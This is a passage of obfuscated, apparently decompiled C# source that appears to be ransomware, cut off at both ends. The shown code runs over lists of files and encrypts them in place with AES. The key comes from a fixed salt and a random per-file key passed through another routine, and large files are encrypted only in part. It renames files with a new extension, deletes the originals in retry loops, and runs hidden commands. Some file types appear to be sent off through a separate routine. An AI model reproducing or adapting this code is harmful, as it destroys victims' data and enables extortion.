													XWEZyRndCFE.iNNSScDiDt(QNsCvQIrCsizt.eqlNXtZpMbqrj.getString_0(107391195), QNsCvQIrCsizt.eqlNXtZpMbqrj.getString_0(107391190), QNsCvQIrCsizt.eqlNXtZpMbqrj.getString_0(107391145), CS_0024_003C_003E8__locals0.JEWgqUOjjJbOLH);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.JEWgqUOjjJbOLH.ToLower().EndsWith(item2) && PoekpaMfsIzdNH == QNsCvQIrCsizt.eqlNXtZpMbqrj.getString_0(107397207))
										{
											try
											{
												XWEZyRndCFE.iNNSScDiDt(QNsCvQIrCsizt.eqlNXtZpMbqrj.getString_0(107391195), QNsCvQIrCsizt.eqlNXtZpMbqrj.getString_0(107391190), QNsCvQIrCsizt.eqlNXtZpMbqrj.getString_0(107391145), CS_0024_003C_003E8__locals0.JEWgqUOjjJbOLH);
											}
											catch
											{
											}
										}
									}
								});
								thread2.Priority = ThreadPriority.Normal;
								thread2.IsBackground = false;
								thread2.Start();
							}
							string text4 = QTGNdgSVzFrIZ.DlttFolCftdlp(32);
							string s4 = uibsyoaCixjw.DOQQVROAHbcwo(text4);
							byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
							if (ZEIkjDrMet == QNsCvQIrCsizt.getString_0(107397204))
							{
								byte[] array2 = null;
								byte[] byte_2 = KpGxARzmOhh.VRtoBnWLnEyOffOBW(CS_0024_003C_003E8__locals0.JEWgqUOjjJbOLH, Convert.ToInt32(DtPlrxKatW) * 1024 * 1024);
								if (KpGxARzmOhh.mQuEGeDjhvV(XCiesfIreL: (!AUEsBSTinpTuD) ? (HtEoifwVYHx ? KpGxARzmOhh.hFniFSRZbJWsGd(byte_2, Encoding.ASCII.GetBytes(text4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : KpGxARzmOhh.hFniFSRZbJWsGd(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.slZaBQOSteyNrUAU), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (HtEoifwVYHx ? kSntQQDhdKClx.retuMYTezoWGtkP(byte_2, Encoding.ASCII.GetBytes(text4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : kSntQQDhdKClx.retuMYTezoWGtkP(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.slZaBQOSteyNrUAU), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), uiFpUcfJDScOD: CS_0024_003C_003E8__locals0.JEWgqUOjjJbOLH, mAsQTvANrOMVS: bytes4))
								{
									goto IL_09e1;
								}
								try
								{
									File.Move(item + CS_0024_003C_003E8__locals0.jMMRdoeBzVf, item);
								}
								catch (Exception)
								{
								}
							}
							else if (!HtEoifwVYHx)
							{
								if (qxPVoZOaesEzvE.qVdRfKhmKIehGw(CS_0024_003C_003E8__locals0.JEWgqUOjjJbOLH, DtPlrxKatW, CS_0024_003C_003E8__locals0.slZaBQOSteyNrUAU))
								{
									goto IL_09e1;
								}
								try
								{
									File.Move(item + CS_0024_003C_003E8__locals0.jMMRdoeBzVf, item);
								}
								catch (Exception)
								{
								}
							}
							else
							{
								if (qxPVoZOaesEzvE.qVdRfKhmKIehGw(CS_0024_003C_003E8__locals0.JEWgqUOjjJbOLH, DtPlrxKatW, text4, bytes4))
								{
									goto IL_09e1;
								}
								try
								{
									File.Move(item + CS_0024_003C_003E8__locals0.jMMRdoeBzVf, item);
								}
								catch (Exception)
								{
								}
							}
							end_IL_02cd_2:;
						}
						catch (Exception)
						{
							goto IL_09e1;
						}
					}
					continue;
					IL_09e1:
					CS_0024_003C_003E8__locals0.yLHvSWZyIOfSs.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.yLHvSWZyIOfSs, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new QNsCvQIrCsizt.iSFmNVBbBBeAPzre();
			CS_0024_003C_003E8__locals0.qqCjCfsGjuRl = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.HFkAavNBdZG = string_0;
			if (CS_0024_003C_003E8__locals0.LuTPQCjXbTuWq.Length != 0)
			{
				string[] luTPQCjXbTuWq = CS_0024_003C_003E8__locals0.LuTPQCjXbTuWq;
				int num = 0;
				while (num < luTPQCjXbTuWq.Length)
				{
					string value = luTPQCjXbTuWq[num];
					if (!CS_0024_003C_003E8__locals0.HFkAavNBdZG.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0ac1;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.HFkAavNBdZG.EndsWith(CS_0024_003C_003E8__locals0.jMMRdoeBzVf))
				{
					goto IL_0ac1;
				}
			}
			catch (Exception)
			{
				goto IL_0ac1;
			}
			if (!HHTmAplzYnkC.Contains(CS_0024_003C_003E8__locals0.HFkAavNBdZG))
			{
				if (yhFbdsJLRKYdl == QNsCvQIrCsizt.getString_0(107396947))
				{
					try
					{
						if (zGlAchxvJLmK.dWjNsbdIDYugAHM(CS_0024_003C_003E8__locals0.HFkAavNBdZG))
						{
							zGlAchxvJLmK.cAezDgsOeZnyK(CS_0024_003C_003E8__locals0.HFkAavNBdZG);
						}
					}
					catch
					{
					}
				}
				HHTmAplzYnkC.Add(CS_0024_003C_003E8__locals0.HFkAavNBdZG);
				if (!fFYazcYEiRSnDfdk.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.HFkAavNBdZG)))
				{
					fFYazcYEiRSnDfdk.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.HFkAavNBdZG));
				}
				ZmXvznsbkj(CS_0024_003C_003E8__locals0.HFkAavNBdZG);
				try
				{
					new fMzozyDPnFPucI().dxDBhZVDUbiD(CS_0024_003C_003E8__locals0.HFkAavNBdZG);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.HFkAavNBdZG, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (AvItfCfoelurZ)
							{
								Console.WriteLine(QNsCvQIrCsizt.getString_0(107405603) + CS_0024_003C_003E8__locals0.HFkAavNBdZG + QNsCvQIrCsizt.getString_0(107405590) + new FileInfo(CS_0024_003C_003E8__locals0.HFkAavNBdZG).Length + QNsCvQIrCsizt.getString_0(107405537));
								Console.WriteLine(QNsCvQIrCsizt.getString_0(107405560));
							}
						}
						catch
						{
						}
						OVDOHnvaqGQX(EGPIgSWIAKjM(QNsCvQIrCsizt.getString_0(107405455)), QNsCvQIrCsizt.getString_0(107390126) + CS_0024_003C_003E8__locals0.HFkAavNBdZG + QNsCvQIrCsizt.getString_0(107390126) + EGPIgSWIAKjM(QNsCvQIrCsizt.getString_0(107405942)) + QNsCvQIrCsizt.getString_0(107390126) + Environment.UserName + QNsCvQIrCsizt.getString_0(107390126) + EGPIgSWIAKjM(QNsCvQIrCsizt.getString_0(107405893)));
					}
				}
				catch (Exception ex2)
				{
					if (XZxMDRItGAyFV)
					{
						try
						{
							File.AppendAllText(yOCAHBSkOQrG, QNsCvQIrCsizt.getString_0(107388562) + CS_0024_003C_003E8__locals0.HFkAavNBdZG + QNsCvQIrCsizt.getString_0(107405868) + ex2.Message + QNsCvQIrCsizt.getString_0(107396383));
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					return;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.HFkAavNBdZG).Length != 0L)
						{
							goto end_IL_031d;
						}
						goto end_IL_031d_2;
						end_IL_031d:;
					}
					catch (Exception ex4)
					{
						if (XZxMDRItGAyFV)
						{
							try
							{
								File.AppendAllText(yOCAHBSkOQrG, QNsCvQIrCsizt.getString_0(107388562) + CS_0024_003C_003E8__locals0.HFkAavNBdZG + QNsCvQIrCsizt.getString_0(107405819) + ex4.Message + QNsCvQIrCsizt.getString_0(107396383));
							}
							catch (Exception)
							{
							}
						}
						cRWjcXvHmjJ++;
						goto end_IL_031d_2;
					}
					if (xUUeBPLKKIuVcVa == QNsCvQIrCsizt.getString_0(107396947) && new FileInfo(CS_0024_003C_003E8__locals0.HFkAavNBdZG).Length > Convert.ToInt32(DtPlrxKatW) * 1024 * 1024)
					{
						try
						{
							if (CS_0024_003C_003E8__locals0.jMMRdoeBzVf != QNsCvQIrCsizt.getString_0(107388822))
							{
								if (JpnkvfNRcNgFvyr)
								{
									CS_0024_003C_003E8__locals0.jMMRdoeBzVf = YGiQSxTfeRxLt + CS_0024_003C_003E8__locals0.jMMRdoeBzVf;
								}
								File.Move(CS_0024_003C_003E8__locals0.HFkAavNBdZG, CS_0024_003C_003E8__locals0.HFkAavNBdZG + CS_0024_003C_003E8__locals0.jMMRdoeBzVf);
							}
						}
						catch (Exception ex6)
						{
							if (XZxMDRItGAyFV)
							{
								try
								{
									File.AppendAllText(yOCAHBSkOQrG, QNsCvQIrCsizt.getString_0(107388562) + CS_0024_003C_003E8__locals0.HFkAavNBdZG + QNsCvQIrCsizt.getString_0(107405726) + ex6.Message + QNsCvQIrCsizt.getString_0(107396383));
								}
								catch (Exception)
								{
								}
							}
							cRWjcXvHmjJ++;
							return;
						}
						if (CS_0024_003C_003E8__locals0.jMMRdoeBzVf != QNsCvQIrCsizt.getString_0(107388822))
						{
							CS_0024_003C_003E8__locals0.HFkAavNBdZG += CS_0024_003C_003E8__locals0.jMMRdoeBzVf;
						}
						if (GymFZfNQBIzJM == QNsCvQIrCsizt.getString_0(107396947))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item3 in WKHvNffqtncUxo)
								{
									if (CS_0024_003C_003E8__locals0.HFkAavNBdZG.ToLower().EndsWith(item3 + CS_0024_003C_003E8__locals0.qqCjCfsGjuRl.jMMRdoeBzVf) && PoekpaMfsIzdNH == QNsCvQIrCsizt.iSFmNVBbBBeAPzre.getString_0(107396953))
									{
										if (Convert.ToInt32(LrknPqaBUod) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.HFkAavNBdZG).Length)
										{
											try
											{
												XWEZyRndCFE.iNNSScDiDt(QNsCvQIrCsizt.iSFmNVBbBBeAPzre.getString_0(107391198), QNsCvQIrCsizt.iSFmNVBbBBeAPzre.getString_0(107391193), QNsCvQIrCsizt.iSFmNVBbBBeAPzre.getString_0(107391148), CS_0024_003C_003E8__locals0.HFkAavNBdZG);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.HFkAavNBdZG.ToLower().EndsWith(item3) && PoekpaMfsIzdNH == QNsCvQIrCsizt.iSFmNVBbBBeAPzre.getString_0(107397210))
									{
										try
										{
											XWEZyRndCFE.iNNSScDiDt(QNsCvQIrCsizt.iSFmNVBbBBeAPzre.getString_0(107391198), QNsCvQIrCsizt.iSFmNVBbBBeAPzre.getString_0(107391193), QNsCvQIrCsizt.iSFmNVBbBBeAPzre.getString_0(107391148), CS_0024_003C_003E8__locals0.HFkAavNBdZG);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = QTGNdgSVzFrIZ.DlttFolCftdlp(32);
						string s = uibsyoaCixjw.DOQQVROAHbcwo(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (ZEIkjDrMet == QNsCvQIrCsizt.getString_0(107397204))
						{
							byte[] array = null;
							byte[] byte_ = KpGxARzmOhh.VRtoBnWLnEyOffOBW(CS_0024_003C_003E8__locals0.HFkAavNBdZG, Convert.ToInt32(DtPlrxKatW) * 1024 * 1024);
							if (!KpGxARzmOhh.mQuEGeDjhvV(XCiesfIreL: (!AUEsBSTinpTuD) ? (HtEoifwVYHx ? KpGxARzmOhh.hFniFSRZbJWsGd(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : KpGxARzmOhh.hFniFSRZbJWsGd(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.slZaBQOSteyNrUAU), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (HtEoifwVYHx ? kSntQQDhdKClx.retuMYTezoWGtkP(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : kSntQQDhdKClx.retuMYTezoWGtkP(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.slZaBQOSteyNrUAU), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), uiFpUcfJDScOD: CS_0024_003C_003E8__locals0.HFkAavNBdZG, mAsQTvANrOMVS: bytes))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.HFkAavNBdZG + CS_0024_003C_003E8__locals0.jMMRdoeBzVf, CS_0024_003C_003E8__locals0.HFkAavNBdZG);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!HtEoifwVYHx)
						{
							if (!qxPVoZOaesEzvE.qVdRfKhmKIehGw(CS_0024_003C_003E8__locals0.HFkAavNBdZG, DtPlrxKatW, CS_0024_003C_003E8__locals0.slZaBQOSteyNrUAU))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.HFkAavNBdZG + CS_0024_003C_003E8__locals0.jMMRdoeBzVf, CS_0024_003C_003E8__locals0.HFkAavNBdZG);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!qxPVoZOaesEzvE.qVdRfKhmKIehGw(CS_0024_003C_003E8__locals0.HFkAavNBdZG, DtPlrxKatW, text, bytes))
						{
							try
							{
								File.Move(CS_0024_003C_003E8__locals0.HFkAavNBdZG + CS_0024_003C_003E8__locals0.jMMRdoeBzVf, CS_0024_003C_003E8__locals0.HFkAavNBdZG);
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
					}
					else
					{
						if (JpnkvfNRcNgFvyr)
						{
							CS_0024_003C_003E8__locals0.jMMRdoeBzVf = YGiQSxTfeRxLt + CS_0024_003C_003E8__locals0.jMMRdoeBzVf;
						}
						string text2 = QTGNdgSVzFrIZ.DlttFolCftdlp(32);
						string s2 = uibsyoaCixjw.DOQQVROAHbcwo(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (CS_0024_003C_003E8__locals0.jMMRdoeBzVf != QNsCvQIrCsizt.getString_0(107388822))
						{
							if (!VdDqLkflmc)
							{
								if (!HtEoifwVYHx)
								{
									ogLAgAYNFI(CS_0024_003C_003E8__locals0.HFkAavNBdZG, CS_0024_003C_003E8__locals0.HFkAavNBdZG + CS_0024_003C_003E8__locals0.jMMRdoeBzVf, bmXnqjSSiXMovR);
								}
								else
								{
									ogLAgAYNFI(CS_0024_003C_003E8__locals0.HFkAavNBdZG, CS_0024_003C_003E8__locals0.HFkAavNBdZG + CS_0024_003C_003E8__locals0.jMMRdoeBzVf, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!HtEoifwVYHx)
									{
										OoNZqxrDFxbIfCy(CS_0024_003C_003E8__locals0.HFkAavNBdZG, CS_0024_003C_003E8__locals0.HFkAavNBdZG + CS_0024_003C_003E8__locals0.jMMRdoeBzVf, bmXnqjSSiXMovR);
									}
									else
									{
										OoNZqxrDFxbIfCy(CS_0024_003C_003E8__locals0.HFkAavNBdZG, CS_0024_003C_003E8__locals0.HFkAavNBdZG + CS_0024_003C_003E8__locals0.jMMRdoeBzVf, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex11)
								{
									if (XZxMDRItGAyFV)
									{
										try
										{
											File.AppendAllText(yOCAHBSkOQrG, QNsCvQIrCsizt.getString_0(107388562) + CS_0024_003C_003E8__locals0.HFkAavNBdZG + QNsCvQIrCsizt.getString_0(107388264) + ex11.Message + QNsCvQIrCsizt.getString_0(107396383));
										}
										catch (Exception)
										{
										}
									}
									cRWjcXvHmjJ++;
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.HFkAavNBdZG + CS_0024_003C_003E8__locals0.jMMRdoeBzVf, CS_0024_003C_003E8__locals0.HFkAavNBdZG);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
						}
						else if (!VdDqLkflmc)
						{
							if (!HtEoifwVYHx)
							{
								ogLAgAYNFI(CS_0024_003C_003E8__locals0.HFkAavNBdZG, CS_0024_003C_003E8__locals0.HFkAavNBdZG + QNsCvQIrCsizt.getString_0(107388817), bmXnqjSSiXMovR);
							}
							else
							{
								ogLAgAYNFI(CS_0024_003C_003E8__locals0.HFkAavNBdZG, CS_0024_003C_003E8__locals0.HFkAavNBdZG + QNsCvQIrCsizt.getString_0(107388817), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!HtEoifwVYHx)
								{
									OoNZqxrDFxbIfCy(CS_0024_003C_003E8__locals0.HFkAavNBdZG, CS_0024_003C_003E8__locals0.HFkAavNBdZG, bmXnqjSSiXMovR);
								}
								else
								{
									OoNZqxrDFxbIfCy(CS_0024_003C_003E8__locals0.HFkAavNBdZG, CS_0024_003C_003E8__locals0.HFkAavNBdZG, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex14)
							{
								if (XZxMDRItGAyFV)
								{
									try
									{
										File.AppendAllText(yOCAHBSkOQrG, QNsCvQIrCsizt.getString_0(107388562) + CS_0024_003C_003E8__locals0.HFkAavNBdZG + QNsCvQIrCsizt.getString_0(107388264) + ex14.Message + QNsCvQIrCsizt.getString_0(107396383));
									}
									catch (Exception)
									{
									}
								}
								cRWjcXvHmjJ++;
								return;
							}
						}
						if (HtEoifwVYHx)
						{
							if (CS_0024_003C_003E8__locals0.jMMRdoeBzVf != QNsCvQIrCsizt.getString_0(107388822))
							{
								sefrHhiPzMkPz(CS_0024_003C_003E8__locals0.HFkAavNBdZG + CS_0024_003C_003E8__locals0.jMMRdoeBzVf, bytes2);
							}
							else
							{
								sefrHhiPzMkPz(CS_0024_003C_003E8__locals0.HFkAavNBdZG, bytes2);
							}
						}
					}
					end_IL_031d_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0ac1;
			IL_0ac1:
			CS_0024_003C_003E8__locals0.yLHvSWZyIOfSs.Remove(CS_0024_003C_003E8__locals0.HFkAavNBdZG);
		});
	}

	private static void WLwUOssbJlcv(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (GymFZfNQBIzJM == getString_0(107396930))
					{
						foreach (string item in WKHvNffqtncUxo)
						{
							if (string_0.ToLower().EndsWith(item) && PoekpaMfsIzdNH == getString_0(107396930))
							{
								if (Convert.ToInt32(LrknPqaBUod) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										XWEZyRndCFE.iNNSScDiDt(getString_0(107391175), getString_0(107391170), getString_0(107391125), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && PoekpaMfsIzdNH == getString_0(107397187))
							{
								try
								{
									XWEZyRndCFE.iNNSScDiDt(getString_0(107391175), getString_0(107391170), getString_0(107391125), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107388800)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107388800), getString_0(107391574)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void OoNZqxrDFxbIfCy(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			if (GymFZfNQBIzJM == getString_0(107396930))
			{
				FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
				foreach (string item in WKHvNffqtncUxo)
				{
					if (string_0.ToLower().EndsWith(item) && PoekpaMfsIzdNH == getString_0(107396930))
					{
						if (Convert.ToInt32(LrknPqaBUod) * 1024 * 1024 > fileStream.Length)
						{
							try
							{
								XWEZyRndCFE.iNNSScDiDt(getString_0(107391175), getString_0(107391170), getString_0(107391125), string_0);
							}
							catch
							{
							}
						}
					}
					else if (string_0.ToLower().EndsWith(item) && PoekpaMfsIzdNH == getString_0(107397187))
					{
						try
						{
							XWEZyRndCFE.iNNSScDiDt(getString_0(107391175), getString_0(107391170), getString_0(107391125), string_0);
						}
						catch
						{
						}
					}
				}
				fileStream.Dispose();
			}
		}
		catch
		{
		}
		if (string_0 != string_1)
		{
			File.Move(string_0, string_1);
			string_0 = string_1;
		}
		byte[] bytes = kSntQQDhdKClx.retuMYTezoWGtkP(File.ReadAllBytes(string_0), byte_0, new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
		File.WriteAllBytes(string_0, bytes);
		JsWoTAjDEfI++;
	}

	private static void ogLAgAYNFI(string string_0, string string_1, byte[] byte_0)
	{
		mbaFPWLgJuSp CS_0024_003C_003E8__locals0 = new mbaFPWLgJuSp();
		CS_0024_003C_003E8__locals0.ErUnvrROTFAPOKHv = string_0;
		CS_0024_003C_003E8__locals0.dwwrLJBHjf = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string dwwrLJBHjf = CS_0024_003C_003E8__locals0.dwwrLJBHjf;
			FileStream fileStream = new FileStream(dwwrLJBHjf, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (BfrRvpyDja == getString_0(107396930))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.ErUnvrROTFAPOKHv, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.ErUnvrROTFAPOKHv, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.ErUnvrROTFAPOKHv, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.dwwrLJBHjf.Length > 0)
				{
					if (GymFZfNQBIzJM == getString_0(107396930))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.ErUnvrROTFAPOKHv, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in WKHvNffqtncUxo)
						{
							if (CS_0024_003C_003E8__locals0.ErUnvrROTFAPOKHv.ToLower().EndsWith(item) && PoekpaMfsIzdNH == getString_0(107396930))
							{
								if (Convert.ToInt32(LrknPqaBUod) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										XWEZyRndCFE.iNNSScDiDt(getString_0(107391175), getString_0(107391170), getString_0(107391125), CS_0024_003C_003E8__locals0.ErUnvrROTFAPOKHv);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.ErUnvrROTFAPOKHv.ToLower().EndsWith(item) && PoekpaMfsIzdNH == getString_0(107397187))
							{
								try
								{
									XWEZyRndCFE.iNNSScDiDt(getString_0(107391175), getString_0(107391170), getString_0(107391125), CS_0024_003C_003E8__locals0.ErUnvrROTFAPOKHv);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.ErUnvrROTFAPOKHv);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.dwwrLJBHjf.EndsWith(getString_0(107388800)))
					{
						File.Move(CS_0024_003C_003E8__locals0.dwwrLJBHjf, CS_0024_003C_003E8__locals0.dwwrLJBHjf.Replace(getString_0(107388800), getString_0(107391574)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.dwwrLJBHjf))
							{
								File.Delete(CS_0024_003C_003E8__locals0.dwwrLJBHjf);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (XZxMDRItGAyFV)
			{
				try
				{
					File.AppendAllText(yOCAHBSkOQrG, getString_0(107388545) + CS_0024_003C_003E8__locals0.ErUnvrROTFAPOKHv + getString_0(107388247) + ex2.Message + getString_0(107396366));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__6()
	{
		List<string> source = oPyjYPETMmli;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
			{
				OVDOHnvaqGQX(EGPIgSWIAKjM(getString_0(107388226)), string_0);
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
		List<string> source2 = oMrXAbQxDplP;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
			{
				OVDOHnvaqGQX(EGPIgSWIAKjM(getString_0(107388181)), string_0);
			};
		}
		Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
		if (aKpUdfVQdWlk == getString_0(107396930))
		{
			string[] uCfuYUimljPybsPL = UCfuYUimljPybsPL;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
				{
					OVDOHnvaqGQX(EGPIgSWIAKjM(getString_0(107388181)), getString_0(107388156) + string_0 + getString_0(107388147));
				};
			}
			Parallel.ForEach(uCfuYUimljPybsPL, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
		}
		if (!HOGYmrndAaRDe().Contains(getString_0(107388891)))
		{
			mjzeUtGoNzXmfZH(UByhimbdThATly);
		}
		else
		{
			List<string> source3 = upVRuDGmCWJQ;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
				{
					OVDOHnvaqGQX(EGPIgSWIAKjM(GQbUuBJqDRmd(getString_0(107388142))), string_0);
				};
			}
			Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
		}
		List<string> source4 = aIfPmSkTtrdy;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
			{
				OVDOHnvaqGQX(EGPIgSWIAKjM(getString_0(107388117)), string_0);
			};
		}
		Parallel.ForEach(source4, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
	}

	private static void _003CMain_003Eb__7(string string_0)
	{
		OVDOHnvaqGQX(EGPIgSWIAKjM(getString_0(107388226)), string_0);
	}

	private static void _003CMain_003Eb__8(string string_0)
	{
		OVDOHnvaqGQX(EGPIgSWIAKjM(getString_0(107388181)), string_0);
	}

	private static void _003CMain_003Eb__9(string string_0)
	{
